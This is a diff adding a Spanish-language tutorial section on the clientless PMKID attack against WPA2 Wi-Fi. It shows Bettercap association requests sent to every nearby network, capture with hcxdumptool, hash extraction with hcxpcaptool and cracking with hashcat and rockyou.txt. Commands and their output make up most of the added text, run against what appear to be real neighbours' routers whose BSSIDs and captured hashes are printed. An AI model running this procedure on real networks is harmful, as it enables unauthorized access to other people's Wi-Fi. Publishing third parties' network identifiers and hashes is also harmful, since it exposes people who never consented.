@@ -61,8 +61,8 @@
         * [Ataque a redes sin clientes](#ataque-a-redes-sin-clientes)
             * [Clientless PKMID Attack](#clientless-pmkid-attack)
                 * [Ataque desde Bettercap](#ataque-desde-bettercap)
-                * [Uso de hcxpcaptool](#uso-de-hcxpcaptool)
                 * [Ataque via hcxdumptool](#ataque-via-hcxdumptool)
+                * [Uso de hcxpcaptool](#uso-de-hcxpcaptool)
         * [Ataques por WPS](#ataques-por-wps)
             * [Uso de Reaver y pixiewps](#uso-de-reaver-y-pixiewps)
             * [Tips con WPSApp](#tips-con-wpsapp)
@@ -3590,6 +3590,245 @@ La principal diferencia con ataques existentes es que en este ataque, la captura
 Information Element) de una simple trama EAPOL, lo cual es flipante y maravilloso.
 
 ##### Ataque desde Bettercap
+
+Aunque no lo hago así, lo explico también. Imaginemos que queremos capturar los Hashes de múltiples redes
+inalámbricas de nuestro entorno. Olvidémonos ya de los Handshakes, y de ataques de de-autenticación y todas
+estas técnicas que habíamos visto previamente.
+
+Lo primero como siempre es ponerse en modo monitor, y desde **Bettercap** efectuar el siguiente procedimiento:
+
+```bash
+┌─[root@parrot]─[/opt/bettercap]
+└──╼ #./bettercap -iface wlan0mon
+bettercap v2.24.1 (built for linux amd64 with go1.10.4) [type 'help' for a list of commands]
+
+ wlan0mon  » wifi.recon on
+[22:38:15] [sys.log] [inf] wifi using interface wlan0mon (e4:70:b8:d3:93:5c)
+[22:38:16] [sys.log] [inf] wifi started (min rssi: -200 dBm)
+ wlan0mon  » [22:38:16] [sys.log] [inf] wifi channel hopper started.
+ wlan0mon  » [22:38:16] [wifi.ap.new] wifi access point MOVISTAR_2A51 (-94 dBm) detected as 78:29:ed:a9:2a:52 (Askey Computer Corp).
+ wlan0mon  » [22:38:16] [wifi.ap.new] wifi access point MOVISTAR_A908 (-83 dBm) detected as fc:b4:e6:99:a9:09 (Askey Computer Corp).
+ wlan0mon  » [22:38:18] [wifi.ap.new] wifi access point MOVISTAR_1677 (-55 dBm) detected as 1c:b0:44:d4:16:78 (Askey Computer Corp).
+ wlan0mon  » [22:38:19] [wifi.ap.new] wifi access point MIWIFI_psGP (-95 dBm) detected as 50:78:b3:ee:bb:ac.
+ wlan0mon  » [22:38:19] [wifi.client.new] new station 20:34:fb:b1:c5:53 detected for MOVISTAR_1677 (1c:b0:44:d4:16:78)
+ wlan0mon  » w[22:38:20] [wifi.ap.new] wifi access point Wlan1 (-81 dBm) detected as f8:8e:85:df:3e:13 (Comtrend Corporation).
+ wlan0mon  » wifi.[22:38:21] [wifi.ap.new] wifi access point devolo-30d32d583c6b (-81 dBm) detected as 30:d3:2d:58:3c:6b (devolo AG).
+ wlan0mon  » wifi.[22:38:21] [wifi.ap.new] wifi access point LowiF7D3 (-90 dBm) detected as 10:62:d0:f6:f7:d8 (Technicolor CH USA Inc.).
+ wlan0mon  » wifi.show[22:38:21] [wifi.ap.new] wifi access point vodafone4038 (-91 dBm) detected as 28:9e:fc:0c:40:3e (Sagemcom Broadband SAS).
+ wlan0mon  » wifi.show[22:38:21] [wifi.ap.new] wifi access point MOVISTAR_3126 (-94 dBm) detected as cc:d4:a1:0c:31:28 (MitraStar Technology Corp.).
+ wlan0mon  » wifi.show
+
+┌─────────┬───────────────────┬─────────────────────┬──────────────────┬──────────────────────┬────┬─────────┬───────┬───────┬──────────┐
+│ RSSI ▴  │       BSSID       │        SSID         │    Encryption    │         WPS          │ Ch │ Clients │ Sent  │ Recvd │   Seen   │
+├─────────┼───────────────────┼─────────────────────┼──────────────────┼──────────────────────┼────┼─────────┼───────┼───────┼──────────┤
+│ -57 dBm │ 1c:b0:44:d4:16:78 │ MOVISTAR_1677       │ WPA2 (CCMP, PSK) │ 2.0                  │ 6  │ 1       │ 486 B │ 172 B │ 22:38:19 │
+│ -83 dBm │ f8:8e:85:df:3e:13 │ Wlan1               │ WPA (TKIP, PSK)  │ 1.0                  │ 9  │         │       │       │ 22:38:20 │
+│ -84 dBm │ fc:b4:e6:99:a9:09 │ MOVISTAR_A908       │ WPA2 (CCMP, PSK) │ 2.0                  │ 1  │         │       │       │ 22:38:17 │
+│ -85 dBm │ 30:d3:2d:58:3c:6b │ devolo-30d32d583c6b │ WPA2 (CCMP, PSK) │ 2.0                  │ 11 │         │       │       │ 22:38:22 │
+│ -86 dBm │ 10:62:d0:f6:f7:d8 │ LowiF7D3            │ WPA2 (TKIP, PSK) │ 2.0                  │ 11 │         │       │       │ 22:38:22 │
+│ -92 dBm │ 28:9e:fc:0c:40:3e │ vodafone4038        │ WPA2 (TKIP, PSK) │ 2.0                  │ 11 │         │       │       │ 22:38:21 │
+│ -94 dBm │ 50:78:b3:ee:bb:ac │ MIWIFI_psGP         │ WPA2 (CCMP, PSK) │ 2.0                  │ 6  │         │       │       │ 22:38:19 │
+│ -94 dBm │ 78:29:ed:a9:2a:52 │ MOVISTAR_2A51       │ WPA2 (CCMP, PSK) │ 2.0                  │ 1  │         │       │       │ 22:38:16 │
+│ -94 dBm │ cc:d4:a1:0c:31:28 │ MOVISTAR_3126       │ WPA2 (CCMP, PSK) │ 2.0 (not configured) │ 11 │         │       │       │ 22:38:21 │
+└─────────┴───────────────────┴─────────────────────┴──────────────────┴──────────────────────┴────┴─────────┴───────┴───────┴──────────┘
+
+wlan0mon (ch. 13) / ↑ 0 B / ↓ 26 kB / 112 pkts
+
+ wlan0mon  »  
+```
+
+Ya viendo que se nos listan todas las redes, corremos el siguiente comando:
+
+```bash
+ wlan0mon  » wifi.assoc all
+ wlan0mon  » [22:39:18] [sys.log] [inf] wifi sending association request to AP MOVISTAR_2A51 (channel:1 encryption:WPA2)
+ wlan0mon  » [22:39:18] [sys.log] [inf] wifi sending association request to AP MOVISTAR_A908 (channel:1 encryption:WPA2)
+ wlan0mon  » [22:39:18] [sys.log] [inf] wifi sending association request to AP MOVISTAR_2F95 (channel:1 encryption:WPA2)
+ wlan0mon  » [22:39:18] [sys.log] [inf] wifi sending association request to AP MIWIFI_psGP (channel:6 encryption:WPA2)
+ wlan0mon  » [22:39:18] [sys.log] [inf] wifi sending association request to AP MOVISTAR_1677 (channel:6 encryption:WPA2)
+ wlan0mon  » [22:39:18] [sys.log] [inf] wifi sending association request to AP Wlan1 (channel:9 encryption:WPA)
+ wlan0mon  » [22:39:18] [sys.log] [inf] wifi sending association request to AP vodafone4038 (channel:11 encryption:WPA2)
+ wlan0mon  » [22:39:18] [sys.log] [inf] wifi sending association request to AP MOVISTAR_3126 (channel:11 encryption:WPA2)
+ wlan0mon  » [22:39:19] [sys.log] [inf] wifi sending association request to AP LowiF7D3 (channel:11 encryption:WPA2)
+ wlan0mon  » [22:39:19] [sys.log] [inf] wifi sending association request to AP devolo-30d32d583c6b (channel:11 encryption:WPA2)
+ wlan0mon  » [22:39:19] [sys.log] [inf] wifi sending association request to AP MOVISTAR_1677 (channel:112 encryption:WPA2)
+ wlan0mon  » [22:39:19] [sys.log] [inf] wifi sending association request to AP MOVISTAR_PLUS_1677 (channel:112 encryption:WPA2)
+ wlan0mon  » [22:39:23] [wifi.client.handshake] captured e4:70:b8:d3:93:5c -> MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap
+ wlan0mon  » [22:39:23] [wifi.client.handshake] captured e4:70:b8:d3:93:5c -> MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap
+ wlan0mon  » [22:39:23] [wifi.client.handshake] captured e4:70:b8:d3:93:5c -> MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap
+ wlan0mon  » [22:39:23] [wifi.client.handshake] captured e4:70:b8:d3:93:5c -> MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap
+ wlan0mon  » [22:39:24] [wifi.client.handshake] captured e4:70:b8:d3:93:5c -> MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap
+ wlan0mon  » [22:39:24] [wifi.client.handshake] captured e4:70:b8:d3:93:5c -> MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap
+ wlan0mon  »  
+```
+
+Sencillo, ¿verdad?, pues ya está, así de fácil. En el fichero **/root/bettercap-wifi-handshakes.pcap** ahora
+lo único que tenemos que pasar es la herramienta **hcxpcaptool** para convertir a Hashes nuestras capturas y
+listo.
+
+Prefiero comentar esta parte con más detalle en los siguientes puntos.
+
+##### Ataque via hcxdumptool
+
+Esta es la forma en la que yo lo suelo hacer. Ejecutamos el siguiente comando para capturar todos los PKMID's
+posibles:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #hcxdumptool -i wlan0mon -o Captura --enable_status=1
+initialization...
+warning: NetworkManager is running with pid 27706
+warning: wpa_supplicant is running with pid 27684
+warning: wlan0mon is probably a monitor interface
+
+start capturing (stop with ctrl+c)
+INTERFACE................: wlan0mon
+ERRORMAX.................: 100 errors
+FILTERLIST...............: 0 entries
+MAC CLIENT...............: b0febdab6d9d
+MAC ACCESS POINT.........: 24336c5495c9 (incremented on every new client)
+EAPOL TIMEOUT............: 150000
+REPLAYCOUNT..............: 62752
+ANONCE...................: 5e37baf7d8026ae9a9b5dcd74239558a74149218819377f2d3d866aa4c6249ab
+
+[22:42:02 - 001] fcb4e699a909 -> b0febdab6d9d [FOUND PMKID CLIENT-LESS]
+[22:42:08 - 006] 1cb044d41678 -> b0febdab6d9d [FOUND PMKID CLIENT-LESS]
+INFO: cha=11, rx=1314, rx(dropped)=602, tx=117, powned=2, err=0
+```
+
+Y como vemos, en cuestión de segundos tengo 2 redes vulnerables de las cuales he obtenido el PKMID. En este
+punto, estaríamos igual que con **Bettercap**, es decir, tenemos la captura, ¿y ahora qué?, descubrámoslo en el siguiente punto.
+
+##### Uso de hcxpcaptool
+
+Ahora viene la parte interesante, hemos visto lo sencillo que ha sido obtener un PKMID de 2 redes distintas.
+Pues ahora tan solo tenemos que aplicar el siguiente comando para visualizar el hash correspondiente a la contraseña de la red inalámbrica:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #ls
+Captura
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #hcxpcaptool -z myHashes Captura 
+
+reading from Captura
+                                                
+summary:                                        
+--------
+file name........................: Captura
+file type........................: pcapng 1.0
+file hardware information........: x86_64
+file os information..............: Linux 4.19.0-parrot1-13t-amd64
+file application information.....: hcxdumptool 5.1.7
+network type.....................: DLT_IEEE802_11_RADIO (127)
+endianness.......................: little endian
+read errors......................: flawless
+packets inside...................: 30
+skipped packets (damaged)........: 0
+packets with GPS data............: 0
+packets with FCS.................: 30
+beacons (total)..................: 9
+beacons (WPS info inside)........: 6
+authentications (OPEN SYSTEM)....: 9
+authentications (BROADCOM).......: 7
+EAPOL packets (total)............: 12
+EAPOL packets (WPA2).............: 12
+PMKIDs (total)...................: 2
+PMKIDs (WPA2)....................: 12
+PMKIDs from access points........: 2
+best PMKIDs......................: 2
+
+2 PMKID(s) written to myHashes
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #cat myHashes 
+0d4191730a005481706436bdbc50919c*fcb4e699a909*b0febdab6d9d*4d4f5649535441525f41393038
+2fb026310184f6efcb0fd0d69b198b3a*1cb044d41678*b0febdab6d9d*4d4f5649535441525f31363737
+```
+
+Y estos, ya pueden ser pasados por **hashcat** para someterlos a la fase de Cracking:
+
+```bash
+┌─[root@parrot]─[/usr/share/wordlists]
+└──╼ #hashcat -m 16800 -d 1 -w 3 myHashes rockyou.txt 
+hashcat (v5.1.0) starting...
+
+OpenCL Platform #1: NVIDIA Corporation
+======================================
+* Device #1: GeForce GTX 1050, 1010/4040 MB allocatable, 5MCU
+
+OpenCL Platform #2: The pocl project
+====================================
+* Device #2: pthread-Intel(R) Core(TM) i7-7700HQ CPU @ 2.80GHz, skipped.
+
+Hashes: 2 digests; 2 unique digests, 2 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers:
+* Zero-Byte
+* Slow-Hash-SIMD-LOOP
+
+Minimum password length supported by kernel: 8
+Maximum password length supported by kernel: 63
+
+Watchdog: Temperature abort trigger set to 90c
+
+* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=1 -D VENDOR_ID=32 -D CUDA_ARCH=601 -D AMD_ROCM=0 -D VECT_SIZE=1 -D DEVICE_TYPE=4 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=16800 -D _unroll'
+Dictionary cache hit:
+* Filename..: rockyou.txt
+* Passwords.: 14344387
+* Bytes.....: 139921538
+* Keyspace..: 14344387
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s
+
+Session..........: hashcat
+Status...........: Running
+Hash.Type........: WPA-PMKID-PBKDF2
+Hash.Target......: myHashes
+Time.Started.....: Mon Aug 12 22:48:04 2019 (3 secs)
+Time.Estimated...: Mon Aug 12 22:53:08 2019 (5 mins, 1 sec)
+Guess.Base.......: File (rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    93064 H/s (55.72ms) @ Accel:512 Loops:128 Thr:64 Vec:1
+Recovered........: 0/2 (0.00%) Digests, 0/2 (0.00%) Salts
+Progress.........: 610384/28688774 (2.13%)
+Rejected.........: 446544/610384 (73.16%)
+Restore.Point....: 0/14344387 (0.00%)
+Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:3712-3840
+Candidates.#1....: 123456789 -> sunflower15
+Hardware.Mon.#1..: Temp: 64c Util: 99% Core:1670MHz Mem:3504MHz Bus:8
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s
+
+Session..........: hashcat
+Status...........: Running
+Hash.Type........: WPA-PMKID-PBKDF2
+Hash.Target......: myHashes
+Time.Started.....: Mon Aug 12 22:48:04 2019 (7 secs)
+Time.Estimated...: Mon Aug 12 22:53:09 2019 (4 mins, 58 secs)
+Guess.Base.......: File (rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    91919 H/s (55.94ms) @ Accel:512 Loops:128 Thr:64 Vec:1
+Recovered........: 0/2 (0.00%) Digests, 0/2 (0.00%) Salts
+Progress.........: 1292574/28688774 (4.51%)
+Rejected.........: 801054/1292574 (61.97%)
+Restore.Point....: 387112/14344387 (2.70%)
+Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:3840-3968
+Candidates.#1....: sunflower11 -> 22lovers
+Hardware.Mon.#1..: Temp: 66c Util:100% Core:1657MHz Mem:3504MHz Bus:8
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => 
+```
+
+En mi caso, tiro de **GPU** y os puedo decir que el tiempo total para cracker estos hashes es de 5 minutos.
+(Aunque también se puede ver en el output anterior).
+
+Se podría decir que es una gozada, porque nos estamos olvidando tanto de **aircrack** como de **aireplay**, de
+**airodump**, **pyrit**, **airolib**, **cowpatty**, **genpmk**, etc.
+
+
+
 
 
 
